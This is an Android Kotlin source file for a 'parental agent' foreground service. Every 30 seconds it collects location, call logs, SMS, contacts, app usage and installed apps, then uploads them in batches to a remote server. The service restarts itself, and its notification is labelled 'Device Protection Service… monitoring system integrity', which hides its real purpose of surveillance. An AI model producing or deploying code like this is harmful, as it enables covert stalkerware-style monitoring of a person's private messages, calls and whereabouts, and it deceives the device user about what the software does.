package com.parental.agent.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.parental.agent.collectors.apps.InstalledAppCollector
import com.parental.agent.collectors.appusage.AppUsageCollector
import com.parental.agent.collectors.calls.CallCollector
import com.parental.agent.collectors.contacts.ContactCollector
import com.parental.agent.collectors.location.LocationCollector
import com.parental.agent.collectors.sms.SmsCollector
import com.parental.agent.data.local.AppDatabase
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.sync.ApiConstants
import com.parental.agent.sync.SyncPayload
import kotlinx.coroutines.*
import org.json.JSONObject

class ForegroundService : Service() {

    companion object {
        private const val TAG = "ForegroundService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "parental_agent_service"
        private const val COLLECTION_INTERVAL_MS = 30000L // 30 seconds
        private const val BATCH_SIZE = 100 // Safe 100-item chunk size per HTTP request
    }

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "ForegroundService created.")
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        startTelemetryCollectorsLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "ForegroundService onStartCommand executed.")
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "ForegroundService destroyed.")
        serviceJob.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startTelemetryCollectorsLoop() {
        serviceScope.launch {
            val locationCollector = LocationCollector(this@ForegroundService)
            val callCollector = CallCollector(this@ForegroundService)
            val smsCollector = SmsCollector(this@ForegroundService)
            val contactCollector = ContactCollector(this@ForegroundService)
            val appUsageCollector = AppUsageCollector(this@ForegroundService)
            val installedAppCollector = InstalledAppCollector(this@ForegroundService)

            while (isActive) {
                try {
                    val locCount = locationCollector.collect()
                    val callCount = callCollector.collect()
                    val smsCount = smsCollector.collect()
                    val contactCount = contactCollector.collect()
                    val usageCount = appUsageCollector.collect()
                    val installedAppCount = installedAppCollector.collect()

                    if (locCount > 0 || callCount > 0 || smsCount > 0 || contactCount > 0 || usageCount > 0 || installedAppCount > 0) {
                        Log.d(TAG, "New Telemetry collected: Loc=$locCount, Calls=$callCount, SMS=$smsCount, Contacts=$contactCount, Usage=$usageCount, InstalledApps=$installedAppCount")
                    }

                    // Perform chunked batch network sync until all pending unsynced events are drained
                    performChunkedNetworkSync()

                } catch (e: Exception) {
                    Log.e(TAG, "Error in telemetry collection loop: ${e.message}", e)
                }
                delay(COLLECTION_INTERVAL_MS)
            }
        }
    }

    private suspend fun performChunkedNetworkSync() {
        try {
            val database = AppDatabase.getInstance(this@ForegroundService)
            val prefs = AppPreferences(this@ForegroundService)
            var hasMoreChunks = true
            var totalBatchesSent = 0

            while (hasMoreChunks && totalBatchesSent < 100) {
                val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = BATCH_SIZE)

                if (unsyncedEvents.isEmpty()) {
                    hasMoreChunks = false
                    break
                }

                val activeDeviceId = prefs.getDeviceId()

                val eventPayloads = unsyncedEvents.map { entity ->
                    val payloadMap = try {
                        val json = JSONObject(entity.payloadJson)
                        val map = mutableMapOf<String, Any?>()
                        json.keys().forEach { key -> map[key] = json.get(key) }
                        map
                    } catch (e: Exception) {
                        emptyMap<String, Any?>()
                    }

                    val eventDevId = if (entity.deviceId.isBlank() || entity.deviceId == "dev_local_agent") activeDeviceId else entity.deviceId

                    mapOf(
                        "eventId" to entity.eventId,
                        "deviceId" to eventDevId,
                        "source" to entity.source,
                        "eventType" to entity.eventType,
                        "timestamp" to entity.timestamp,
                        "collectionMethod" to entity.collectionMethod,
                        "payload" to payloadMap
                    )
                }

                val payload = SyncPayload(
                    deviceId = activeDeviceId,
                    events = eventPayloads
                )

                Log.i(TAG, "Posting Chunk Batch #${totalBatchesSent + 1} (${unsyncedEvents.size} events) to server for device $activeDeviceId...")
                val response = ApiConstants.apiService.syncEvents(payload)

                if (response.isSuccessful && response.body()?.success == true) {
                    val body = response.body()
                    val serverConfirmedIds = body?.syncedEventIds.orEmpty()
                    val localEventIds = unsyncedEvents.map { it.eventId }
                    val confirmedSyncedIds = localEventIds.filter { id -> serverConfirmedIds.contains(id) }

                    if (confirmedSyncedIds.isNotEmpty()) {
                        database.eventDao().markEventsSynced(confirmedSyncedIds)
                        Log.i(TAG, "SUCCESS: Server ACK confirmed for ${confirmedSyncedIds.size} event(s) in chunk batch #${totalBatchesSent + 1}!")
                    }

                    hasMoreChunks = unsyncedEvents.size == BATCH_SIZE
                    totalBatchesSent++
                } else {
                    Log.w(TAG, "Chunk Batch upload failed or unconfirmed by server. Pausing chunk loop.")
                    hasMoreChunks = false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in performChunkedNetworkSync: ${e.message}", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Device Protection Service",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "Keeps device protection active in real-time."
            channel.setShowBadge(false)

            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device Protection Service")
            .setContentText("Active and monitoring system integrity.")
            .setSmallIcon(android.R.drawable.stat_sys_warning)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }
}
